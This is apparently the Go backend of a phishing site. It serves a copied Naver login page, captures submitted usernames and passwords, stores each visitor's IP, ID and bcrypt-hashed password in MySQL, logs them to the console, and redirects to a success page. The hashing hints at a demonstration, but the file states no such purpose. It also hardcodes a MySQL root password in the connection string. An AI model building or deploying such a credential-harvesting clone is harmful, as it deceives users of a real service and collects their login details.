package main

import (
	"database/sql"
	_ "github.com/go-sql-driver/mysql"
	"golang.org/x/crypto/bcrypt"
	"net/http"
	"fmt"
	"time"
)

var db *sql.DB
var err error

func SuccessPage(res http.ResponseWriter, req *http.Request){
	if req.Method != "POST"{
		http.ServeFile(res, req, "success.html")
		return
	}
}

func Mpage(res http.ResponseWriter, req *http.Request){
	if req.Method != "POST"{
		http.ServeFile(res, req, "naver/nidlogine18a.html")
		return
	}
	redirectTarget := "/success"
	t := time.Now().UTC()
	t = t.In(time.FixedZone("KST", 9*60*60))

	username := req.FormValue("username")
	password := req.FormValue("password")

	// 패스워드 일방향 암화화
	hashedPassword, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	if err != nil {
		panic(err.Error())
	}

	ipaddr := req.RemoteAddr
	accesstime := t.Format("2006-01-02 15:04:05")

	_, err = db.Exec("INSERT INTO users(ip, username, password) VALUES(?, ?, ?)",ipaddr, username, hashedPassword)
	if err != nil {
		panic(err.Error())
	}
	http.Redirect(res, req, redirectTarget, 302)
	fmt.Println("접속시간: [",accesstime,"]","접속IP: [",ipaddr,"]","ID: [",username,"]","비밀번호: [",hashedPassword,"]")
}

func main(){
	db, err = sql.Open("mysql", "root:8282op82@#@tcp(localhost:3306)/dchk")
	if err != nil {
		panic(err.Error())
	}
	defer db.Close()

	err = db.Ping()
	if err != nil {
		panic(err.Error())
	}

	http.Handle("/", http.FileServer(http.Dir("naver/")))

	http.HandleFunc("/success", SuccessPage)
	http.HandleFunc("/login", Mpage)
	http.ListenAndServe(":8632", nil)
}
